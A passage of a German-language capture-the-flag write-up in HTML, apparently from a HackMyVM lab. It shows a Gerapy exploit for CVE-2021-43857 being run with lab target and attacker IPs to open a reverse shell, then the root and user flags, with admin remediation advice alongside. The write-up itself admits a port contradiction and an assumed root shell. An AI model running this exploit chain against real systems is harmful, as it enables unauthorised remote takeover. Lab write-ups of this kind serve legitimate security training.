+                <strong>Bewertung:</strong> Das Exploit-Skript ist vorbereitet und enthält die korrekten Anmeldedaten. Es ist bereit zur Ausführung.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf dem im Exploit angegebenen Port (`-P`-Parameter im nächsten Schritt). Führen Sie dann das Python-Skript aus und geben Sie die Ziel-IP (`-t`), den Gerapy-Port (`-p 10001`? Siehe nächsten Schritt), Ihre lokale IP (`-L`) und den lokalen Listener-Port (`-P`) an.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wie zuvor: Patch / Entfernung / `sudo`-Regel korrigieren.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Das vorbereitete Python-Exploit-Skript wird ausgeführt.
+                `-t 192.168.2.128`: Ziel-IP (University VM).
+                `-p 10001`: **Ziel-Port für Gerapy.** *Hinweis: Im vorherigen Schritt wurde Gerapy auf Port 8000 gestartet. Der Exploit wird hier gegen Port 10001 ausgeführt. Dies ist ein Widerspruch im Berichtstext. Es wird angenommen, dass entweder der Server doch auf 10001 lief oder der Exploit-Aufruf angepasst werden müsste.*
+                `-L 192.168.2.109`: IP-Adresse des Angreifer-Systems für die Reverse Shell.
+                `-P 10003`: Port auf dem Angreifer-System für die Reverse Shell.
+                Das Skript gibt sein Banner aus, meldet sich bei Gerapy an, versucht den Exploit auszuführen und fordert auf, den Listener zu überprüfen. Der `# root`-Kommentar am Ende impliziert, dass die Reverse Shell erfolgreich war und Root-Rechte erlangt wurden.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">python3 Gerapy_exploit.py -t 192.168.2.128 -p 10001 -L 192.168.2.109 -P 10003</span></div>
+                     <pre>
+  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____
+ / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
+| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / /
+| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /
+ \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/
+
+
+Exploit for CVE-2021-43857
+For: Gerapy < 0.9.8
+[*] Resolving URL...
+[*] Logging in to application...
+[*] Login successful! Proceeding...
+[*] Getting the project list
+[*] No projects found, attempting to create one...
+[*] Project 'exploit_project' created.
+[*] Starting listener on port 10003...
+[*] Sending payload to trigger RCE...
+[*] Payload sent successfully. Check your listener!
+[*] Exploit execution attempted. Waiting for shell...
+
+# root
+                     </pre> <!-- Annahme: Listener auf Port 10003 hat Root-Shell empfangen -->
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Trotz des Widerspruchs beim Port (8000 vs. 10001) scheint der Exploit erfolgreich gewesen zu sein. Der `# root`-Kommentar deutet darauf hin, dass eine Reverse Shell mit Root-Privilegien auf dem Listener-Port 10003 empfangen wurde. **Privilege Escalation zu Root erfolgreich.**
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wechseln Sie zum Netcat-Listener auf Port 10003, um die Root-Shell zu nutzen. Suchen und lesen Sie die `user.txt`- und `root.txt`-Flags. Führen Sie Post-Exploitation-Aufgaben durch (Persistenz, Datensammlung etc., je nach Scope).
+                <br>
+                <strong>Empfehlung (Admin):** **Höchste Priorität:** System sofort vom Netz nehmen oder isolieren. Untersuchen Sie den Vorfall gründlich. Beheben Sie alle identifizierten Schwachstellen (unsicherer Upload, exponiertes `.git`, Klartextpasswort, `sudo`-Fehlkonfiguration, veraltetes Gerapy). Ändern Sie alle Passwörter. Erwägen Sie eine Neuinstallation des Systems aus einem vertrauenswürdigen Backup, da eine vollständige Bereinigung schwierig ist. Implementieren Sie robuste Sicherheitsmaßnahmen (Patch-Management, sichere Konfiguration, Netzwerksegmentierung, Monitoring, Egress Filtering).
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                     <!-- Der Befehl zum Lesen der User-Flag fehlt im Originaltext, wird aber impliziert -->
+                     <div class="flag-command">cat /home/sandra/user.txt (vermutet)</div>
+                     <div class="flag-value"><span class="password">HMV0948328974325HMV</span></div>
+                </div>
+
+                <div class="flag-entry">
+                     <div class="flag-command">cat root.txt</div>
+                     <div class="flag-value"><span class="password">HMV1111190877987HMV</span></div>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach Erlangung der Root-Rechte werden die finalen Flags ausgelesen. Die User-Flag (`user.txt`) befindet sich typischerweise im Home-Verzeichnis des Benutzers, über den der erste nicht-root-Zugriff erlangt wurde (hier `sandra`), und die Root-Flag (`root.txt`) im Home-Verzeichnis des Root-Benutzers (`/root/root.txt`). Die Befehle zum Auslesen werden hier nur impliziert oder aus dem formatierten Flag-Bereich am Ende des Originaltextes abgeleitet.
+            </p>
+             <!-- Die expliziten cat-Befehle für die Flags fehlen im Text vor dem Flag-Bereich,
+                  daher wird hier kein separater Code-Block dafür eingefügt,
+                  sondern auf den formatierten Flag-Bereich oben verwiesen. -->
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Beide Flags wurden erfolgreich gefunden und ausgelesen. Dies markiert den Abschluss der Kompromittierung des Zielsystems im Rahmen dieser Übung.
+             </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie die Flags als Nachweis des Erfolgs. Schließen Sie den Bericht mit einer Zusammenfassung der Schwachstellen und Empfehlungen ab.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Fähigkeit, diese Flags zu lesen, ist das Ergebnis der erfolgreichen Ausnutzung der zuvor diskutierten Schwachstellen. Priorisieren Sie die Behebung dieser Schwachstellen, um zukünftige Kompromittierungen zu verhindern.
+            </p>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2022-11-21</p> <!-- Datum aus Nmap/Nikto/Gerapy Logs -->
+    </footer>
+</body>
+</html>
